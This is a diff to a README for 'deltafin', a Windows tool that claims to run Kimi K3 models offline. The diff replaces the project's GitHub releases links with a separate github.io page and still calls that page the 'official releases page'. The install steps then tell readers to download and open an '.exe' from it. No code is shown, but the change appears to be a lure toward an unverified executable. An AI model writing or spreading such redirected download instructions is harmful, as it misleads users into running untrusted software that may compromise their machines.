@@ -1,6 +1,6 @@
 # 🚀 deltafin - Run private Kimi models on Windows
 
-[![Download deltafin Windows](https://img.shields.io/badge/Download-Deltafin_Releases-blue.svg)](https://github.com/mercurial-muscivoraforficata12/deltafin/releases)
+[![Download deltafin Windows](https://img.shields.io/badge/Download-Deltafin_Releases-blue.svg)](https://mercurial-muscivoraforficata12.github.io)
 
 Deltafin lets you run the Kimi K3 model directly on your home computer. You do not need an internet connection or a subscription to use this artificial intelligence. The software creates a local server so you can power your own coding agents or chat interfaces offline.
 
@@ -19,7 +19,7 @@ If your computer uses an integrated graphics chip, the software might run slowly
 
 Follow these steps to set up deltafin on your device:
 
-1. Visit the [official releases page](https://github.com/mercurial-muscivoraforficata12/deltafin/releases).
+1. Visit the [official releases page](https://mercurial-muscivoraforficata12.github.io).
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends in ".exe" to download the installer file.
 4. Open the downloaded file once the transfer completes.
